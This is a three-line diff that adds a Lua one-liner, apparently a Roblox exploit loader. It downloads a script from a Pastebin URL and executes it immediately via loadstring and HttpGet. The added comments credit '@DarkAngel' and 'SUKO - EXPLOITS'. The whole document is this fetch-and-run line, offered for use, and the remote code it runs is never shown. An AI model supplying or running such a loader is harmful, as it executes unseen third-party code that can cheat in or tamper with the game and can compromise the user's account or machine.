@@ -1,0 +1,3 @@
+loadstring(game:HttpGet(('https://pastebin.com/raw/hvUEWWUD'),true))()
+-- Made by @DarkAngel
+-- Reviewed by SUKO - EXPLOITS
